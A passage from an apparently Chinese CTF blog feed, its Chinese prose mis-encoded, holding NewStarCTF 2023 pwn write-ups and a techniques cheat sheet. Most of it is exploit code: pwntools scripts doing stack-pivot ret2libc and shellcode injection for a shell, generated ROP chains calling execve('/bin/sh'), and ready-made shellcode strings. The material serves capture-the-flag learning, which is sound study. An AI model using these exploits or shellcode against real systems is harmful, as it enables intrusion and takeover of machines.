class="line">rdi_addr = <span class="number">0x401333</span></span><br><span class="line">ret_addr = <span class="number">0x4012AB</span></span><br><span class="line">main = <span class="number">0x4011FB</span></span><br><span class="line">leave = <span class="number">0x4012AA</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;I have a small gift for you: &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;more infomation plz:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main)</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;I have a small gift for you: &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode-revenge">shellcode revenge</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œå¼€å¯ NX å’Œ Canaryï¼ŒIDA åç¼–è¯‘ä¸€ä¸‹ï¼Œä»£ç å®¡è®¡çœ‹çš„è„‘å£³ç—›ã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/11.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/12.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/13.png"></p>
<p>æŠŠå®˜æ–¹ wp è´´è¿™é‡Œï¼Œåç»­æ‡‚äº†å†æ¥æ”¹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pythonå¤åˆ¶ç¼–è¾‘<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27904</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./shellcodere&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;\x33\x42\x38&#x27;</span>  <span class="comment"># 33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\x42\x30&#x27;</span>  <span class="comment"># 31 42 30 xor DWORD PTR [rdx+0x30], eax</span></span><br><span class="line">payload += <span class="string">b&#x27;\x33\x42\x37&#x27;</span>  <span class="comment"># 33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\x42\x38&#x27;</span>  <span class="comment"># 31 42 38 xor DWORD PTR [rdx+0x38], eax</span></span><br><span class="line">payload += <span class="string">b&#x27;\x59&#x27;</span> * (<span class="number">0x30</span> - <span class="built_in">len</span>(payload))  <span class="comment"># 59 pop rcx</span></span><br><span class="line">payload += <span class="string">b&#x27;\x4e\x44&#x27;</span> * <span class="number">2</span>  <span class="comment"># syscall 0x4e^0x41=0xf 0x44^0x41=0x5</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>         <span class="comment"># xor key</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;magic\n&quot;</span>, payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x50</span> + asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>æ ˆè¿ç§»è¿™å—è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œshellcode çš„ç›¸å…³æ‰‹æ³•è¿˜å¾—ç»§ç»­å­¦ä¹  -_-ï¼Œè¿˜å¾—ç»§ç»­åŠªåŠ›å•Šï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>NewStarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! æŠ€å·§ (2)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(2)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! æŠ€å·§ (2)</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹ï¼š</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! æŠ€å·§ (1)</a></p>
<p>ç´§æ¥ä¸Šæ¬¡æŠ€å·§ï¼ˆ1ï¼‰ï¼Œè¿™æ¬¡æ€»ç»“ä¸€äº›å·¥å…·çš„ç”¨æ³•å’Œæ¨¡æ¿ï¼Œä¿—è¯è¯´å¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ï¼Œè®°å½•ä¸€æ‰‹</p>
<hr>
<h2><span id="ç¯å¢ƒ">ç¯å¢ƒ</span></h2><p>32ä½ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,<span class="built_in">arch</span> = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>64ä½ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">context( log_level = <span class="string">&#x27;debug&#x27;</span>,<span class="built_in">arch</span> = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span> )</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="æŸ¥æ‰¾ç¨‹åºæ‰€åŠ¨æ€é“¾æ¥çš„åº“">æŸ¥æ‰¾ç¨‹åºæ‰€åŠ¨æ€é“¾æ¥çš„åº“</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldd æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/1.png"></p>
<hr>
<h2><span id="ropgadget">ROPgadget</span></h2><p>åœ¨æ„é€ ropé“¾çš„æ—¶å€™ï¼Œéœ€è¦ä¸€äº›å¯„å­˜å™¨çš„åœ°å€ï¼Œå°±å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary æ–‡ä»¶å | grep <span class="string">&#x27;ret&#x27;</span>    <span class="comment">#æ³¨æ„retæ˜¯å¯ä»¥æ”¹æˆåˆ«çš„æ¬§ï¼Œåƒrdi,rsiå¯„å­˜å™¨å•¥çš„</span></span><br></pre></td></tr></table></figure>

<p>åœ¨é‡åˆ°é™æ€é“¾æ¥çš„æ—¶å€™ï¼Œå¾€å¾€ç”¨ROPgadgetæœç´¢å°±ä¼šå‡ºç°ä¸€å¤§å †åœ°å€ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦åŒºåˆ†ä¸€ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary æ–‡ä»¶å --only <span class="string">&quot;pop|ret&quot;</span> | grep <span class="string">&#x27;eax&#x27;</span>   <span class="comment">#æ ¹æ®è‡ªå·±çš„éœ€è¦è¿›è¡Œæ”¹åŠ¨</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯åšret2syscallå°±éœ€è¦binshï¼Œin 0x80ï¼Œå°±ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary æ–‡ä»¶å --string <span class="string">&#x27;/bin/sh&#x27;</span> </span><br><span class="line">ROPgadget --binary æ–‡ä»¶å --string <span class="string">&#x27;sh&#x27;</span></span><br><span class="line">ROPgadget --binary æ–‡ä»¶å --string <span class="string">&#x27;int 0x80&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ROPgadgetè¿˜å¯ä»¥ç›´æ¥æ„é€ ropé“¾ï¼ˆä¸»è¦äº‰å¯¹çš„æ˜¯é™æ€é“¾æ¥ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary æ–‡ä»¶å --ropchain</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/2.png"></p>
<h2><span id="32ä½">32ä½</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = b<span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += b<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea064) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += b<span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080481c9) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080de769) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, 0x0806c943) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure>

<h2><span id="64ä½">64ä½</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = b<span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000040a30d) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c0) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000419a1c) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += b<span class="string">&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000041ac41) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000040a30d) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c8) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000417e25) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000041ac41) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000401d1d) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c0) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000040a30d) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c8) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000401858) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c8) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000417e25) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000401243) <span class="comment"># syscall</span></span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="onegadget">Onegadget</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">one_gadget  libcç‰ˆæœ¬</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/3.png"></p>
<hr>
<h2><span id="seccomp">Seccomp</span></h2><p>å­˜åœ¨æ²™ç®±ï¼Œå°±éœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼Œç¬¬ä¸€ç‚¹å°±æ˜¯return ALLOWï¼ˆallowä¹Ÿå°±æ˜¯å…è®¸å¯è¡Œï¼‰ï¼Œç¬¬äºŒç‚¹å°±æ˜¯return KILLï¼ˆkillä¹Ÿå°±æ˜¯æ€æ­»ç¦æ­¢ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/4.png"></p>
<hr>
<h2><span id="readelf">readelf</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">readelf -S ./111 | grep bss     æŸ¥çœ‹å¯è¯»å¯å†™çš„bssæ®µ</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/5.png"></p>
<hr>
<h2><span id="shellcode">shellcode</span></h2><p>å¯ä»¥ç”¨å·¥å…·ç¼–å†™shellcodeï¼ˆåˆ’é‡ç‚¹ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„å°±æ˜¯ç¯å¢ƒï¼Œä¸æ ‡æ³¨ç¯å¢ƒé»˜è®¤ä¸º32ä½çš„ï¼Œè®©é›¨æœé‡åˆ°64ä½shellcodeçš„é¢˜ç›®ï¼Œå°±éœ€è¦æ ‡æ³¨ç¯å¢ƒï¼Œä¸Šé¢æœ‰è‡ªå·±ç¿»ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥è‡ªå·±æ‰¾ <a href="https://www.exploit-db.com/">https://www.exploit-db.com</a> ï¼ˆæ ¹æ®é¢˜ç›®çš„è¦æ±‚ï¼Œé€‰å–é€‚åˆçš„å­—èŠ‚ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32ä½ çŸ­å­—èŠ‚shellcode --&gt; 21å­—èŠ‚</span></span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32ä½ çº¯asciiå­—ç¬¦shellcode</span></span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32ä½ scanfå¯è¯»å–çš„shellcode</span></span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64ä½ scanfå¯è¯»å–çš„shellcode 22å­—èŠ‚</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span 